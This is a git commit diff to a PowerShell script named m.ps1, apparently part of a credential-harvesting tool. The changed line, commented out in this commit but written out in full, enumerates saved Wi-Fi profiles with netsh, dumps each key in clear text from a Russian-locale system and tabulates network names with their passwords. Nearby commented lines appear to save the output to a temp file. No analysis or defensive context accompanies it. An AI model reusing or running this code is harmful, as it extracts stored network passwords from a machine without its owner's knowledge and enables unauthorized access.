1cb1c0748b08c083473aea526c1ad2f5d94eeaa3
lol_are_you_gay <50666295+Kirill2045@users.noreply.github.com>
2021-09-03 21:03:37 +0300

    Update m.ps1

--- m.ps1
+++ m.ps1
@@ -95,7 +95,7 @@ for ($i=0; $i -lt 5; $i++){
 }
 # WL "END"
 # echo "56565656565656565656565656"
-WL (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize
+#WL (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize
 # > $env:TEMP\w.txt
 # $w=$env:TEMP+'\w.txt'
 # if("7"-in $arh)
